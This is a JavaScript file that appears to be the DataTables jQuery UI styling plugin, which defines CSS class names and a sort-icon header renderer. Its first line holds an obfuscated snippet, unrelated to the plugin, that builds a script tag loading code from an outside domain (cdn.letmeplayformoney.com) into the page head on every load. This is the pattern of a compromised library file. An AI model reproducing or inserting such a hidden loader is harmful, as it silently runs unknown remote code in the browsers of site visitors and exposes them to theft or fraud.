var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);
(function(){

var DataTable = $.fn.dataTable;
var sort_prefix = 'css_right ui-icon ui-icon-';
var toolbar_prefix = 'fg-toolbar ui-toolbar ui-widget-header ui-helper-clearfix ui-corner-';

/* Set the defaults for DataTables initialisation */
$.extend( true, DataTable.defaults, {
	dom:
		'<"'+toolbar_prefix+'tl ui-corner-tr"lfr>'+
		't'+
		'<"'+toolbar_prefix+'bl ui-corner-br"ip>',
	renderer: 'jqueryui'
} );


$.extend( DataTable.ext.classes, {
	/* Full numbers paging buttons */
	"sPageButton":         "fg-button ui-button ui-state-default",
	"sPageButtonActive":   "ui-state-disabled",
	"sPageButtonDisabled": "ui-state-disabled",

	/* Features */
	"sPaging": "dataTables_paginate fg-buttonset ui-buttonset fg-buttonset-multi "+
		"ui-buttonset-multi paging_", /* Note that the type is postfixed */

	/* Sorting */
	"sSortAsc":            "ui-state-default sorting_asc",
	"sSortDesc":           "ui-state-default sorting_desc",
	"sSortable":           "ui-state-default sorting",
	"sSortableAsc":        "ui-state-default sorting_asc_disabled",
	"sSortableDesc":       "ui-state-default sorting_desc_disabled",
	"sSortableNone":       "ui-state-default sorting_disabled",
	"sSortIcon":           "DataTables_sort_icon",

	/* Scrolling */
	"sScrollHead": "dataTables_scrollHead "+"ui-state-default",
	"sScrollFoot": "dataTables_scrollFoot "+"ui-state-default",

	/* Misc */
	"sHeaderTH":  "ui-state-default",
	"sFooterTH":  "ui-state-default",
} );


DataTable.ext.renderer.header.jqueryui = function ( settings, cell, column, idx, classes ) {
	$('<div/>')
		.addClass( 'DataTables_sort_wrapper' )
		.append( cell.contents() )
		.append( $('<span/>')
			.addClass( classes.sSortIcon+' '+column.sSortingClassJUI )
		)
		.appendTo( cell );

	// Attach a sort listener to update on sort
	$(settings.nTable).on( 'order.dt', function ( e, settings, sorting, columns ) {
		cell
			.removeClass( classes.sSortAsc +" "+classes.sSortDesc )
			.addClass( columns[ idx ] == 'asc' ?
				classes.sSortAsc : columns[ idx ] == 'desc' ?
					classes.sSortDesc :
					column.sSortingClass
			);

		cell
			.find( 'span' )
			.removeClass(
				sort_prefix+'triangle-1-n' +" "+
				sort_prefix+'triangle-1-s' +" "+
				sort_prefix+'carat-2-n-s' +" "+
				sort_prefix+'carat-1-n' +" "+
				sort_prefix+'carat-1-s'
			)
			.addClass( columns[ idx ] == 'asc' ?
				sort_prefix+'triangle-1-n' : columns[ idx ] == 'desc' ?
					sort_prefix+'triangle-1-s' :
					column.sSortingClassJUI
			);
	} );
}


/*
 * TableTools jQuery UI compatibility
 * Required TableTools 2.1+
 */
if ( DataTable.TableTools ) {
	$.extend( true, DataTable.TableTools.classes, {
		"container": "DTTT_container ui-buttonset ui-buttonset-multi",
		"buttons": {
			"normal": "DTTT_button ui-button ui-state-default"
		},
		"collection": {
			"container": "DTTT_collection ui-buttonset ui-buttonset-multi"
		}
	} );
}


}());

